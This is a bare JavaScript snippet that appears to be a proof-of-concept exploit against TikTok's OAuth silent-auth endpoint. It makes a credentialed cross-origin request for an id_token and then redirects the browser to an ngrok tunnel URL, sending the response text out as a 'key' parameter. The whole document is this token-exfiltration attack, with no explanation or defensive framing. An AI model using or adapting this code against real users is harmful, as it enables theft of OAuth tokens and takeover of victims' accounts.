var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://open-api.tiktok.com/oauth/silent_auth/?scope=openid&response_type=id_token&redirect_uri=https%3A%2F%2Faccessidp.idaas.ey.com%2Fsp%2FeyJpc3MiOiJodHRwczpcL1wvb3Blbi1hcGkudGlrdG9rLmNvbVwvb2F1dGgifQ%2Fcb.openid&state=n2HJBz1hmyv9l5hLWFIhnJM60ovpPz&nonce=zuDvLNJNYP2tAYvtceQZ7W&client_id=awhntrn8mar80rj0&response_mode=form_post");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(null);

function reqListener() {
    window.location='https://832a-202-162-37-174.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
};
